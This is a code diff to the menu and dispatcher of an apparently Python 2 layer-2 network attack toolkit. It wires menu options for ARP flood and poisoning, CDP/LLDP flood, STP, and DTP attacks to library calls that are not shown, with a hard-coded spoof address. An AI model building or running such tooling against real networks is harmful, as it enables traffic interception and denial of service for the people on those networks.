@@ -6,6 +6,8 @@ from lib import sshlib
 from lib import arplib
 from lib import vlanlib
 from lib import stplib
+from lib import dtplib
+from lib import cdp_lldp
 class GUI:
 	def makefgui():
 		pass
@@ -35,15 +37,15 @@ class commandline:
 		[2]ssh bruteforce
 		[3]router vulnerability exploit
 		[4]switch vulnerability exploit
-		[5]arp flood
-		[6]arp poison
+		[5]arp flood[!]
+		[6]arp poison[!]
 		[7]dhcp flood
 		[8]dhcp posion
-		[9]cdp/lldp flood
-		[10]stp attack
-		[11]vlan hopping attack
+		[9]cdp/lldp flood[!]
+		[10]stp attack[!!]
+		[11]vlan hopping attack[!!]
 		[12]vtp attack
-		[13]dtp attack
+		[13]dtp attack[-]
 		[0]host alive detect
 ----------------------------------------
 		'''
@@ -80,16 +82,16 @@ class commandline:
 				pass
 			elif cmd[1]=="4":
 				print 4
-				a=arplib.arpfloodlib()
-				a.run(1,self.target_ip)
 				pass
 			elif cmd[1]=="5":
 				print 5
-				a=arplib.arpposion()
-				a.run(self.target_ip,"192.168.237.11")
+				a=arplib.arpfloodlib()
+				a.run(1,self.target_ip)
 				pass
 			elif cmd[1]=="6":
 				print 6
+				a=arplib.arpposion()
+				a.run(self.target_ip,"192.168.237.11")
 				pass
 			elif cmd[1]=="7":
 				print 7
@@ -99,12 +101,13 @@ class commandline:
 				pass
 			elif cmd[1]=="9":
 				print 9
+				a=cdp_lldp.cdplib()
+				a.run()
 				pass
 			elif cmd[1]=="10":
 				print 10
 				a=stplib.stplib(self.target_ip)
-				a.run_confflood()
-				a.run_tcnflood()
+				a.run(0)#0:conf 1:tcn
 				pass
 			elif cmd[1]=="11":
 				print 11
@@ -116,6 +119,8 @@ class commandline:
 				pass
 			elif cmd[1]=="13":
 				print 13
+				a=dtplib.dtplib(self.target_ip)
+				a.run()
 				pass
 			elif cmd[1]=="0":
 				print 0
